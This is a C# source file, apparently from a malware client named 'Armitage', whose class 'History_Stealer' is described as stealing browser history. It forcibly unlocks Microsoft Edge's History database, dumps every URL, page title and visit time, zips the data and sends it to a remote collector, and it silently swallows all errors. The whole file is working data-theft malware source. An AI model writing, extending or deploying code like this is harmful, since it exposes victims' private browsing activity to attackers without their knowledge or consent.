using System;
using System.Collections.Generic;
using System.Data.SQLite;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Data;
using System.Windows.Forms;

namespace Client.Armitage.Cookies
{
    /// <summary>
    /// Steals history from all supported browsers.
    /// </summary>
    public static class History_Stealer
    {
        private static DateTime _ge = DateTime.Parse("1601-01-01");

        public static bool FromEdge()
        {
            return ParseAndSendSQL(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\AppData\Local\Microsoft\Edge\User Data\Default\History");
        }
        public static bool ParseAndSendSQL(string pathtosql)
        {
            try
            {
                Utilities.Files_And_Pathing.KillLocks(pathtosql);

                if (File.Exists(pathtosql))
                {
                    string tempname = Path.GetTempFileName() + "e";

                    File.Copy(pathtosql, tempname);

                    string connection = @"Data Source=" + pathtosql;
                    var con = new SQLiteConnection(connection);
                    con.Open();

                    string stm = "SELECT * FROM urls";
                    var cmd = new SQLiteCommand(stm, con);

                    StringBuilder sb = new StringBuilder();
                    sb.AppendLine($"History From {pathtosql}");
                    sb.AppendLine($"id | url | site title | visit count | typed count | last visit | ishidden");
                    SQLiteDataReader rdr = cmd.ExecuteReader();
                    int maxlength = rdr.FieldCount;

                    while (rdr.Read())
                    {
                        for (int i = 0; i < maxlength; i++)
                        {
                            if (i == 5)
                            {
                                // parse date correctly
                                long seconds = rdr.GetInt64(i) / 1000000;

                                DateTime visitdate = _ge.AddSeconds(seconds);

                                sb.Append(visitdate.ToString() + " |");
                            }
                            else
                            {
                                sb.Append(rdr.GetValue(i).ToString() + " |");
                            }
                        }
                        sb.Append(Environment.NewLine);
                    }

                    Utilities.Zip_Creator k = new Utilities.Zip_Creator();

                    k.AddTextFile(sb.ToString(), "History.txt");

                    var btyes = k.CreateZip();

                    Communication.File_Stacker.Send(btyes, Communication.File_Stacker.Filetype.File, "History.zip");

                    return true;
                }
            }
            catch (Exception ex) { }

            return false ;
        }
        public static void SendOne()
        {
            Task.Run(() =>
            {


            });
        }
    }
}
